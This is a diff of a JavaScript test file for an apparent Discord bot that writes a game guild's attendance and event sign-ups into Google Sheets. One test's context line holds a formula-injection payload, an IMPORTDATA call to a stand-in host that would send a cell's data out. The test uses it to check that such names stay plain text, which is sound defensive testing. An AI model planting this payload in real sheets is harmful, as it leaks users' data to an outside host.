@@ -250,6 +250,15 @@ describe('managedTab.merge (what people typed is kept)', () => {
     assert.equal(out.kept, 0);
   });
 
+  it('a different formula in a bot formula cell is replaced by the bot\'s (the "E2" Sheets kept of "E2:E2", stale row numbers)', () => {
+    const h = ['Tên game', 'Số lần'];
+    const before = [h, ['An', '=COUNTIF(E2:F2,"✅*")'], ['Bình', '=COUNTIF(E3:F3,"✅*")']];
+    const current = [h, ['An', '=COUNTIF(E2;"✅*")'], ['Bình', '=COUNTIF(E49;"✅*")']];
+    const out = merge({ header: h, keyOf, rows: [['An', fx('=COUNTIF(E{r}:F{r},"✅*")')], ['Bình', fx('=COUNTIF(E{r}:F{r},"✅*")')]], current, before, sep: ';' });
+    assert.deepEqual(out.rows, [['An', fx('=COUNTIF(E2:F2;"✅*")')], ['Bình', fx('=COUNTIF(E3:F3;"✅*")')]]);
+    assert.equal(out.kept, 0);
+  });
+
   it('only fx() values are formulas: a Discord name starting with "=" is plain text; a formula people typed stays a formula', () => {
     const h = ['Tên game', 'Phái'];
     const evil = '=IMPORTDATA("//x.yz/"&H2)';
@@ -410,7 +419,7 @@ describe('feed.buildSheet', () => {
       { war: w2, regs: [{ discordId: sid(1), status: 'join' }, { discordId: sid(2), status: 'absent' }, { discordId: sid(3), status: 'join' }] },
     ];
     const ls = tab(buildSheet(data({ history, attendance })), feed.HISTORY_TAB);
-    assert.deepEqual(ls.header, [...feed.HISTORY_FIXED, 'T7 03/10', 'T7 10/10', 'Số lần báo đi', 'Discord ID']);
+    assert.deepEqual(ls.header, [...feed.HISTORY_FIXED, 'T7 03/10', 'T7 10/10', 'Số trận đi', 'Discord ID']);
     assert.deepEqual(ls.rows.map((r) => [r[0], r[3], r[4], r[5]]), [
       ['Người Mới', fx('=IFERROR(VLOOKUP($A{r},ThanhVien!$A:$Q,6,FALSE),"")'), '🆕 Chưa vào bang', '🆕 Chưa vào bang'],
       ['An Game', fx('=IFERROR(VLOOKUP($A{r},ThanhVien!$A:$Q,6,FALSE),"")'), '⚠️ Đăng ký nhưng không tham gia', '✅ Đi'],
@@ -420,7 +429,7 @@ describe('feed.buildSheet', () => {
     assert.ok(!ls.rows.some((r) => r[7] === sid(3)), 'the stranger is not written');
   });
 
-  it('BaoDanh: one row per character, V / X / blank per finished war (the result screen wins), the last 12 wars, a count formula', () => {
+  it('BaoDanh: one row per character, V / X / ! / – / blank per finished war (the result screen wins), the last 12 wars, a count formula', () => {
     const w1 = war(1, 3);
     const w2 = war(2, 10);
     const attendance = { wars: [{ eventId: String(w1._id) }], people: new Map([[sid(1), { byWar: new Map([[String(w1._id), 'noShow']]) }]]) };
@@ -431,8 +440,8 @@ describe('feed.buildSheet', () => {
     const bd = tab(buildSheet(data({ matrix, attendance })), feed.MATRIX_TAB);
     assert.deepEqual(bd.header, ['STT', 'Tên game', 'Phái', '03/10', '10/10', 'Số trận đi']);
     assert.deepEqual(bd.rows.map((r) => r.slice(0, 5)), [
-      [1, 'Người Mới', bd.rows[0][2], '', ''], // not in the guild yet / nobody linked: blank
-      [2, 'An Game', bd.rows[1][2], 'X', 'V'], // registered for the first war but the result screen did not show them
+      [1, 'Người Mới', bd.rows[0][2], '–', '–'], // not in the guild yet
+      [2, 'An Game', bd.rows[1][2], '!', 'V'], // registered for the first war but the result screen did not show them
     ]);
     assert.deepEqual(bd.rows[1][5], fx('=COUNTIF(D{r}:E{r},"V")'));
     assert.ok(bd.rows.every((r) => r[1]), 'characters only: no Discord-only rows');
@@ -448,6 +457,7 @@ describe('feed.buildSheet', () => {
     const events = [
       { event: ev(1, 'Tiệc'), replies: [{ discordId: sid(3), status: 'yes' }, { discordId: sid(2), status: 'no' }, { discordId: sid(1), status: 'yes' }] },
       { event: ev(2, 'Trống'), replies: [{ discordId: sid(4), status: 'yes' }] },
+      { event: { ...ev(3, 'Huỷ'), status: 'cancelled' }, replies: [{ discordId: sid(1), status: 'yes' }] }, // left out
     ];
     const sk = tab(buildSheet(data({ events })), feed.EVENT_TAB);
     assert.deepEqual(sk.rows, [
